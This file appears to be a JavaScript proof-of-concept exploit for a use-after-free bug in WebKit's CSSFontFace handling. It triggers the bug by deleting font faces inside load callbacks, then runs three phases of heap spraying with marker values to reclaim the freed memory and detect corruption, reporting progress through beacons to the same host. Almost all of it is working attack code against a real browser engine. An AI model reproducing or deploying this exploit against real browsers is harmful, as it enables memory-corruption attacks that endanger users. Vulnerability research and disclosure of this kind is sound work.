// p170 — CSSFontFace UAF via reference_wrapper dangling reference
// WebKit-1200 CSSFontFaceSet::matchingFacesExcludingPreinstalledFonts returns
// std::reference_wrapper<CSSFontFace> (non-owning). Fix changed to Ref<>.
// setStatus() fires client.fontStateChanged() JS callback WITHOUT Ref protection
// in fontLoadEventOccurred() — removing the face during callback = dangling ref.
// Beacon prefix: V170-

(function() {
  var T = Date.now;
  function B(tag) {
    try { navigator.sendBeacon('/beacon/V170-' + tag + '?t=' + T()); } catch(e) {}
  }

  B('BOOT');

  // Minimal valid WOFF2 font (empty glyph, single char 'A')
  // We use a tiny base64-encoded font to trigger the load path
  var MINI_WOFF2 = 'data:font/woff2;base64,d09GMgABAAAAAADcAAoAAAAAARAAAACRAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAARABEAEQARABEAAAACwAAAQIAAgQGBggMEBQYHCMmKDI6P0dRW2V0gJGktcXg/wAEIABEACAAOABkAGgAbABwAHYAfACEAJIAmgCwANIA+gANARcBIQErATUBQQFNAVUBaQF3AYUBmwG9AeUB+wEXAT0BTQF7AYkBrwHNAfcBAAUGAAAHCAAABwgA';

  // ---- TEST 1: FontFace API availability ----
  try {
    var testFace = new FontFace('V170Test', 'url(' + MINI_WOFF2 + ')');
    B('T1-FONTFACE-OK');
  } catch(e) {
    B('T1-FONTFACE-ERR-' + e.message.substring(0, 30));
    return;
  }

  // ---- TEST 2: document.fonts availability ----
  try {
    var fontsApi = document.fonts;
    B('T2-DOCFONTS-' + (fontsApi ? 'OK' : 'NULL'));
    if (!fontsApi) return;
  } catch(e) {
    B('T2-DOCFONTS-ERR');
    return;
  }

  // ---- TEST 3: Add/delete FontFace ----
  try {
    document.fonts.add(testFace);
    B('T3-ADD-OK');
    document.fonts.delete(testFace);
    B('T3-DEL-OK');
  } catch(e) {
    B('T3-ERR-' + e.message.substring(0, 30));
  }

  // ---- TEST 4: Font load promise ----
  try {
    var faces = [];
    for (var i = 0; i < 8; i++) {
      var f = new FontFace('V170Font' + i, 'url(' + MINI_WOFF2 + ')');
      document.fonts.add(f);
      faces.push(f);
    }
    B('T4-ADDED-' + faces.length);

    // Load triggers matchingFacesExcludingPreinstalledFonts
    document.fonts.load('12px V170Font0').then(function(loaded) {
      B('T4-LOADED-' + loaded.length);
    }).catch(function(e) {
      B('T4-LOAD-ERR-' + e.message.substring(0, 30));
    });
  } catch(e) {
    B('T4-ERR-' + e.message.substring(0, 30));
  }

  // ---- TEST 5: CSSFontFace UAF trigger ----
  // Strategy: Create faces, start loading, remove during fontStateChanged callback
  setTimeout(function() {
    B('T5-START');

    try {
      // Create victim faces via @font-face CSS rule
      var style = document.createElement('style');
      style.textContent = '';
      for (var i = 0; i < 16; i++) {
        style.textContent += '@font-face { font-family: "Victim' + i + '"; src: url(' + MINI_WOFF2 + '); }\n';
      }
      document.head.appendChild(style);
      B('T5-CSS-ADDED');

      // Also add via JS API for the removal path
      var jsFaces = [];
      for (var i = 0; i < 16; i++) {
        var jf = new FontFace('JSVictim' + i, 'url(' + MINI_WOFF2 + ')');
        document.fonts.add(jf);
        jsFaces.push(jf);
      }
      B('T5-JSFACES-' + jsFaces.length);

      // Set up the slotchange / fontStateChanged trigger
      // When fonts load, the callback fires — we'll delete faces during it
      var deleteCount = 0;
      var loadPromises = [];

      for (var i = 0; i < 16; i++) {
        (function(idx) {
          var p = document.fonts.load('12px JSVictim' + idx).then(function(result) {
            // DURING this callback, delete OTHER faces to trigger UAF
            // matchingFacesExcludingPreinstalledFonts holds std::reference_wrapper
            // to CSSFontFace objects. If we delete them here...
            for (var j = idx + 1; j < jsFaces.length; j++) {
              try { document.fonts.delete(jsFaces[j]); deleteCount++; } catch(e) {}
            }
            // Also remove the CSS rules
            if (idx === 0 && style.parentNode) {
              style.parentNode.removeChild(style);
            }
            return result ? result.length : -1;
          });
          loadPromises.push(p);
        })(i);
      }

      Promise.all(loadPromises).then(function(results) {
        B('T5-ALL-DONE-del' + deleteCount);
        // If we get here without crash, faces were protected or freed safely
        // Now try to trigger use of potentially freed references

        // Re-check fonts that were deleted during callbacks
        try {
          var checkResult = document.fonts.check('12px JSVictim0');
          B('T5-CHECK-' + checkResult);
        } catch(e) {
          B('T5-CHECK-ERR-' + e.message.substring(0, 30));
        }

        // Phase 2: Aggressive UAF attempt
        setTimeout(function() { phase2(); }, 50);
      }).catch(function(e) {
        B('T5-PROMISE-ERR-' + e.message.substring(0, 30));
      });
    } catch(e) {
      B('T5-ERR-' + e.message.substring(0, 30));
    }
  }, 200);

  // Phase 2: Tighter UAF window using fontLoaded + heap spray
  function phase2() {
    B('P2-START');

    try {
      // Create face that will be freed during its own load callback
      var victim = new FontFace('P2Victim', 'url(' + MINI_WOFF2 + ')');
      document.fonts.add(victim);

      // Pre-allocate spray buffers
      var SPRAY_SIZE = 256; // Size of CSSFontFace object (approximate)
      var SPRAY_COUNT = 4000;
      var spray = [];
      var marker = 0x41414141;

      victim.load().then(function() {
        B('P2-VICTIM-LOADED');

        // Delete the victim face — this may free the CSSFontFace C++ object
        document.fonts.delete(victim);
        victim = null;

        // Immediately spray heap to reclaim the freed memory
        for (var i = 0; i < SPRAY_COUNT; i++) {
          var buf = new ArrayBuffer(SPRAY_SIZE);
          var view = new Uint32Array(buf);
          view[0] = marker;
          view[1] = marker + 1;
          view[2] = i;
          view[3] = 0xDEADBEEF;
          spray.push(buf);
        }
        B('P2-SPRAYED-' + spray.length);

        // Now trigger document.fonts operations that might access freed CSSFontFace
        try {
          var result = document.fonts.check('12px P2Victim');
          B('P2-CHECK-FREED-' + result);
        } catch(e) {
          B('P2-CHECK-ERR-' + e.message.substring(0, 30));
        }

        // Try loading with the freed face name
        document.fonts.load('12px P2Victim').then(function(r) {
          B('P2-LOAD-FREED-' + r.length);
          phase3();
        }).catch(function(e) {
          B('P2-LOAD-ERR-' + e.message.substring(0, 30));
          phase3();
        });
      }).catch(function(e) {
        B('P2-LOAD-FAIL-' + e.message.substring(0, 30));
        phase3();
      });
    } catch(e) {
      B('P2-ERR-' + e.message.substring(0, 30));
      phase3();
    }
  }

  // Phase 3: setStatus re-entrancy via concurrent loads + deletions
  function phase3() {
    B('P3-START');

    try {
      // Create many faces and load them concurrently
      var faces3 = [];
      var NFACES = 64;
      for (var i = 0; i < NFACES; i++) {
        var f = new FontFace('P3Font' + i, 'url(' + MINI_WOFF2 + ')');
        document.fonts.add(f);
        faces3.push(f);
      }
      B('P3-CREATED-' + NFACES);

      // Start loading ALL of them
      var loaded = 0;
      var deleted = 0;

      faces3.forEach(function(face, idx) {
        face.load().then(function() {
          loaded++;
          // During each load callback, delete other pending faces
          // This creates the race: fontLoadEventOccurred() calls pump() + client callbacks
          // WITHOUT Ref<CSSFontFace> protection (only timeoutFired has it)
          if (idx % 4 === 0) {
            for (var d = idx + 1; d < idx + 4 && d < faces3.length; d++) {
              try {
                document.fonts.delete(faces3[d]);
                deleted++;
              } catch(e) {}
            }
          }

          if (loaded === NFACES || loaded + deleted >= NFACES) {
            B('P3-DONE-loaded' + loaded + '-del' + deleted);

            // Spray to reclaim freed CSSFontFace memory
            var spray3 = [];
            for (var s = 0; s < 2000; s++) {
              var buf = new ArrayBuffer(256);
              var v = new Uint32Array(buf);
              v[0] = 0xCAFEBABE;
              v[1] = s;
              spray3.push(buf);
            }

            // Try to trigger use of freed faces
            for (var c = 0; c < NFACES; c++) {
              try {
                document.fonts.check('12px P3Font' + c);
              } catch(e) {}
            }
            B('P3-CHECKS-DONE');

            // Final: check if any spray buffers got corrupted (would indicate
            // CSSFontFace write-after-free into our spray)
            var corrupted = 0;
            for (var s = 0; s < spray3.length; s++) {
              var v = new Uint32Array(spray3[s]);
              if (v[0] !== 0xCAFEBABE) {
                corrupted++;
                if (corrupted <= 3) {
                  B('P3-CORRUPT-' + s + '-' + v[0].toString(16));
                }
              }
            }
            B('P3-CORRUPT-TOTAL-' + corrupted);
            B('DONE');
          }
        }).catch(function() { loaded++; });
      });

    } catch(e) {
      B('P3-ERR-' + e.message.substring(0, 30));
      B('DONE');
    }
  }
})();
